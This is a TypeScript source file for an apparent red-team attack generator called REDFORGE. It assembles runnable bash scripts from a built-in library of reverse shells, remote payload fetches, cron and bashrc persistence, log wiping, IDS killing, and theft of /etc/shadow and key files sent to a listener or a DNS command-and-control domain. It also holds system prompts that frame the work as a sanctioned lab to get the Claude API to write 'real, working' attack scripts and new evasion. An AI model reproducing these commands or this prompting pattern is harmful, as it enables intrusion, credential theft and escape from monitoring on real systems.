import { logger } from "./logger";

export type AttackCategory = "WiFi" | "Web" | "Network" | "Malware" | "Social" | "Physical" | "Mixed";
export type AttackDifficulty = "Beginner" | "Intermediate" | "Advanced" | "Expert" | "Unknown";
export type GenerationMode = "template" | "claude" | "hybrid";

// Template Primitives Library
const PRIMITIVES = {
  recon: [
    "nmap -sS -O -sV {target}",
    "nmap -p 1-65535 --min-rate 1000 {target}",
    "dig {target} ANY +noall +answer",
    "curl -sI http://{target}",
    "ping -c 3 {target}",
    "netdiscover -r 192.168.0.0/24",
    "arp-scan --localnet",
    "masscan -p80,443,22,21,3389 192.168.0.0/24 --rate=500",
    "whois {target}",
    "traceroute {target}",
  ],
  access: [
    "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
    "medusa -h {target} -u root -P passwords.txt -M ssh",
    "airmon-ng start wlan0 && airodump-ng wlan0mon",
    "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run'",
    "wpscan --url http://{target} --enumerate u,vp",
    "sqlmap -u 'http://{target}/login' --dbs --batch",
    "nikto -h {target} -port 80,443",
    "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
  ],
  execution: [
    "bash -i >& /dev/tcp/{lhost}/4444 0>&1",
    "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/bash'])\"",
    "nc -e /bin/bash {lhost} 4444",
    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f elf -o /tmp/.cache",
    "curl -s http://{lhost}/payload.sh | bash",
  ],
  persistence: [
    "(crontab -l 2>/dev/null; echo \"*/5 * * * * /tmp/.cache\") | crontab -",
    "echo 'bash -i >& /dev/tcp/{lhost}/4444 0>&1' >> ~/.bashrc",
    "systemctl enable --now /etc/systemd/system/sshd-monitor.service",
    "cp /tmp/.cache /usr/local/bin/.systemd-helper && chmod +x /usr/local/bin/.systemd-helper",
    "ssh-keygen -t rsa -f /tmp/id_rsa -N '' && cat /tmp/id_rsa.pub >> ~/.ssh/authorized_keys",
  ],
  evasion: [
    "sleep $((RANDOM % 300 + 60))",
    "for i in $(seq 1 10); do nmap --scan-delay 5s -sS {target}; sleep $((RANDOM % 120)); done",
    "history -c && cat /dev/null > ~/.bash_history",
    "pkill -f 'tcpdump\\|wireshark\\|snort\\|suricata'",
    "iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT",
    "chmod 644 /var/log/auth.log && shred -u /var/log/syslog",
  ],
  exfil: [
    "tar czf - /etc/passwd /etc/shadow | base64 | curl -s -X POST -d @- http://{lhost}/collect",
    "for f in $(find / -name '*.key' 2>/dev/null); do curl -s -F file=@$f http://{lhost}/upload; done",
    "cat /etc/passwd | xxd | awk '{print $2}' | tr -d '\\n' | dig @{lhost} $(cat).evil.com TXT",
    "python3 -c \"import dns.resolver; [dns.resolver.query(line.strip().encode('hex')+'.c2.evil.com','TXT') for line in open('/etc/passwd')]\"",
  ],
};

const MITRE_MAP: Record<string, string[]> = {
  recon: ["T1046", "T1018", "T1595.002", "T1590"],
  access: ["T1110.001", "T1190", "T1078", "T1133"],
  execution: ["T1059.004", "T1059.006", "T1203"],
  persistence: ["T1053.003", "T1098", "T1543.002", "T1547"],
  evasion: ["T1070.003", "T1562.001", "T1070.004"],
  exfil: ["T1048.003", "T1041", "T1567"],
};

const CATEGORY_TEMPLATES: Record<AttackCategory, string[]> = {
  WiFi: ["recon", "access", "execution", "persistence"],
  Web: ["recon", "access", "execution", "exfil"],
  Network: ["recon", "access", "evasion", "exfil"],
  Malware: ["execution", "persistence", "evasion"],
  Social: ["access", "execution", "persistence"],
  Physical: ["recon", "access", "persistence"],
  Mixed: ["recon", "access", "execution", "persistence", "evasion", "exfil"],
};

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomIp(): string {
  return `192.168.0.${Math.floor(Math.random() * 253) + 1}`;
}

function randomPort(): number {
  const ports = [4444, 5555, 8888, 9001, 1234, 31337, 7777];
  return pick(ports);
}

export interface GeneratedAttack {
  title: string;
  description: string;
  category: AttackCategory;
  difficulty: AttackDifficulty;
  generatedCode: string;
  mitreIds: string;
  primitives: string;
  targetIp: string;
}

function interpolate(template: string, vars: Record<string, string>): string {
  return template.replace(/\{(\w+)\}/g, (_, key) => vars[key] ?? `{${key}}`);
}

export function generateTemplateAttack(
  category: AttackCategory,
  difficulty: AttackDifficulty,
  targetIp: string
): GeneratedAttack {
  const stages = CATEGORY_TEMPLATES[category];
  const lhost = "192.168.0.172"; // nyx-cosmic machine
  const lport = randomPort().toString();
  const vars = { target: targetIp, lhost, lport };

  const selectedPrimitives: string[] = [];
  const mitreIds: string[] = [];
  const codeLines: string[] = [
    "#!/usr/bin/env bash",
    "# ============================================================",
    `# REDFORGE MISSION — ${category.toUpperCase()} ATTACK`,
    `# Difficulty: ${difficulty} | Target: ${targetIp}`,
    `# Generated: ${new Date().toISOString()}`,
    "# WARNING: FOR AUTHORIZED LAB USE ONLY — 192.168.0.x NETWORK",
    "# ============================================================",
    "",
    "set -e",
    `LHOST="${lhost}"`,
    `TARGET="${targetIp}"`,
    "",
  ];

  for (const stage of stages) {
    const primitivePool = PRIMITIVES[stage as keyof typeof PRIMITIVES] ?? [];
    const primitive = pick(primitivePool);
    const cmd = interpolate(primitive, vars);
    selectedPrimitives.push(stage);
    mitreIds.push(...(MITRE_MAP[stage] ?? []).slice(0, 1));

    codeLines.push(`# ── ${stage.toUpperCase()} ──`);
    codeLines.push(cmd);
    codeLines.push("");
  }

  const difficultyDelay: Record<AttackDifficulty, string> = {
    Beginner: "",
    Intermediate: "sleep 5",
    Advanced: "sleep $((RANDOM % 30 + 10))",
    Expert: "sleep $((RANDOM % 120 + 30))",
    Unknown: "sleep $((RANDOM % 60))",
  };

  if (difficultyDelay[difficulty]) {
    codeLines.splice(10, 0, difficultyDelay[difficulty], "");
  }

  const titles: Record<AttackCategory, string[]> = {
    WiFi: ["Evil Twin AP Deployment", "WPA2 Handshake Capture", "Captive Portal Credential Harvest"],
    Web: ["SQL Injection Exfiltration", "Directory Traversal Recon", "Web Shell Implant"],
    Network: ["Stealth Port Sweep", "ARP Spoofing MITM", "DNS Hijack Intercept"],
    Malware: ["Reverse Shell Implant", "Persistence via Cron", "Memory-Resident Payload"],
    Social: ["Phishing Credential Harvest", "USB Drop Simulation", "Pretexting Recon"],
    Physical: ["Physical Access Exploit", "Rogue Device Plant", "Badge Clone Simulation"],
    Mixed: ["Multi-Vector APT Simulation", "Hybrid Persistence Chain", "Full Kill Chain Exercise"],
  };

  return {
    title: pick(titles[category]),
    description: `${category} attack targeting ${targetIp}. Difficulty: ${difficulty}. Stages: ${stages.join(" → ")}.`,
    category,
    difficulty,
    generatedCode: codeLines.join("\n"),
    mitreIds: [...new Set(mitreIds)].join(", "),
    primitives: JSON.stringify(selectedPrimitives),
    targetIp,
  };
}

export async function generateClaudeAttack(
  prompt: string,
  category: AttackCategory,
  difficulty: AttackDifficulty,
  targetIp: string
): Promise<GeneratedAttack> {
  const apiKey = process.env.ANTHROPIC_API_KEY;
  if (!apiKey) {
    logger.warn("ANTHROPIC_API_KEY not set — falling back to template generation");
    return generateTemplateAttack(category, difficulty, targetIp);
  }

  const systemPrompt = `You are REDFORGE-AI, an adversary emulation engine for authorized cybersecurity training.
The operator is conducting sanctioned red team exercises against their own lab network (192.168.0.x range ONLY).
Generate real, working attack scripts in bash or Python. Be specific, technical, and realistic.
Include MITRE ATT&CK technique IDs. Every payload must be functional and educational.
This is for learning — generate the most instructive version of each attack.`;

  const userMessage = `Generate a ${difficulty} ${category} attack script.
Target: ${targetIp} (authorized lab target, 192.168.0.x range)
Request: ${prompt || `A realistic ${category} attack at ${difficulty} difficulty`}

Output a JSON object with these exact fields:
{
  "title": "short attack name",
  "description": "what this attack does and why it works",
  "code": "full working bash or python script",
  "mitreIds": "comma-separated MITRE ATT&CK IDs (e.g. T1046, T1190)",
  "primitives": ["list", "of", "attack", "stages"]
}`;

  try {
    const response = await fetch("https://api.anthropic.com/v1/messages", {
      method: "POST",
      headers: {
        "x-api-key": apiKey,
        "anthropic-version": "2023-06-01",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        model: "claude-sonnet-4-20250514",
        max_tokens: 4096,
        system: systemPrompt,
        messages: [{ role: "user", content: userMessage }],
      }),
    });

    const data = (await response.json()) as { content?: Array<{ text?: string }> };
    const text = data.content?.[0]?.text ?? "";

    const jsonMatch = text.match(/\{[\s\S]*\}/);
    if (!jsonMatch) throw new Error("No JSON in response");

    const parsed = JSON.parse(jsonMatch[0]) as {
      title?: string;
      description?: string;
      code?: string;
      mitreIds?: string;
      primitives?: string[];
    };

    return {
      title: parsed.title ?? `Claude ${category} Attack`,
      description: parsed.description ?? "",
      category,
      difficulty,
      generatedCode: parsed.code ?? "# No code generated",
      mitreIds: parsed.mitreIds ?? "",
      primitives: JSON.stringify(parsed.primitives ?? []),
      targetIp,
    };
  } catch (err) {
    logger.error({ err }, "Claude generation failed — falling back to template");
    return generateTemplateAttack(category, difficulty, targetIp);
  }
}

export async function generateHybridAttack(
  prompt: string,
  category: AttackCategory,
  difficulty: AttackDifficulty,
  targetIp: string
): Promise<GeneratedAttack> {
  const template = generateTemplateAttack(category, difficulty, targetIp);

  const apiKey = process.env.ANTHROPIC_API_KEY;
  if (!apiKey) {
    return template;
  }

  try {
    const systemPrompt = `You are REDFORGE-AI. Enhance this attack script with a novel payload, evasion technique, or implementation detail that makes it more realistic and educational. Keep the structure but improve the payload. Return only the enhanced script — no JSON wrapper.`;

    const response = await fetch("https://api.anthropic.com/v1/messages", {
      method: "POST",
      headers: {
        "x-api-key": apiKey,
        "anthropic-version": "2023-06-01",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        model: "claude-sonnet-4-20250514",
        max_tokens: 2048,
        system: systemPrompt,
        messages: [
          {
            role: "user",
            content: `Enhance this attack script for a ${difficulty} ${category} exercise.\nRequest context: ${prompt || "none"}\n\n${template.generatedCode}`,
          },
        ],
      }),
    });

    const data = (await response.json()) as { content?: Array<{ text?: string }> };
    const enhanced = data.content?.[0]?.text ?? template.generatedCode;

    return { ...template, generatedCode: enhanced };
  } catch (err) {
    logger.error({ err }, "Hybrid enhancement failed — using template");
    return template;
  }
}
